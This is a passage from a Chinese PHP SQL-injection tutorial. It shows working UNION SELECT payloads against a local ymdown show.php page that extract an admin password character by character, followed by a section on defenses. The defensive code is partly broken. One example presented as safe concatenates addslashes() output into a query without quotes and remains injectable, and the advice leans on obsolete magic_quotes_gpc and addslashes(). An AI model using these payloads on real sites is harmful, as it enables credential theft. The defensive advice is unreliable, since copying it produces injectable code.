height="551" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php11.gif" width="662" style="border:0px;"></p><p><span style="font-weight:700;">验证测试结果</span></p><p>　　整个渗透过程就结束了，不过由于黑白把入口给改了，无法登陆，但我们仅仅测试注入，目的已经达到了，就没有必要进后台了，我后来又继续构造SQL语句来验证我们获取的密码是否正确，依次提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,1,1))=49<br>#验证第一位密码<br>http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,2,1))=50<br>#验证第二位密码<br>http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,3,1))=51<br>#验证第三位密码<br>http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,4,1))=52<br>#验证第四位密码<br>http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,5,1))=53<br>#验证第五位密码<br>http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,6,1))=54<br>#验证第六位密码</span></p></td></tr></tbody></table></div><p>　　用select char(49,50,51,52,53,54)就可以得到123456。<br>　　OK！测试结束，验证我们的结果没有错误。说明一下，密码本身是123456，可以不用ord()函数而直接猜，但为了大家能看到一个完整的过程，我还是“专业”一点好了。下面补一幅截图，是本文写完后，重新测试HB时截取的：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="531" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php12.gif" width="612" style="border:0px;"></p><p><span style="font-weight:700;">注入的防范</span></p><p>　　防范可以从两个方面着手，一个就是服务器，二个就是代码本身，介绍服务器配置的文章很多了，无非就是把magic_quotes_gpc设置为On，display_errors设置为Off，这里也就不在多说，既然本文接触都是程序的问题，我们还是从程序本身寻找原因。<br>　　如果说php比asp易用，安全，从内置的函数就可以体现出来。如果是整形的变量，只需使用一个intval()函数即可解决问题，在执行查询之前，我们先处理一下变量，如下面的例子就是很安全的了：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">$id = intval($id);<br>mysql_query("SELECT * FROM article WHERE articleid='$id'");</span></p></td></tr></tbody></table></div><p>　　或者这样写：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">mysql_query("SELECT * FROM article WHERE articleid=".intval($id)."")</span></p></td></tr></tbody></table></div><p>　　不管如何构造，最终还是会先转换为整形猜放入数据库的。很多大型程序都是这样写，非常简洁。<br>　　字符串形的变量也可以用addslashes()整个内置函数了，这个函数的作用和magic_quotes_gpc一样，使用后，所有的 ' (单引号), " (双引号), \ (反斜线) and 空字符会自动转为含有反斜线的溢出字符。而且新版本的php，就算magic_quotes_gpc打开了，再使用addslashes()函数，也不会有冲突，可以放心使用。例子如下：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">$username = addslashes($username);<br>mysql_query("SELECT * FROM members WHERE userid='$username'");</span></p></td></tr></tbody></table></div><p>　　或者这样写：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">mysql_query("SELECT * FROM members WHERE userid=".addslashes($username)."")</span></p></td></tr></tbody></table></div><p>　　使用addslashes()函数还可以避免引号配对错误的情况出现。而刚才的前面搜索引擎的修补方法就是直接把“_”、“%”转换为“\_”“\%”就可以了，当然也不要忘记使用addslashes()函数。具体代码如下：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">$keywords = addslashes($keywords);<br>$keywords = str_replace("_","\_",$keywords);<br>$keywords = str_replace("%","\%",$keywords);</span></p></td></tr></tbody></table></div><p>　　不用像ASP那样，过滤一点变量，就要写一大堆的代码，就是上面的一点点代码，我们就可以把本文所有的问题解决了，是不是很简便？</p><p>&nbsp;</p>                                    </div>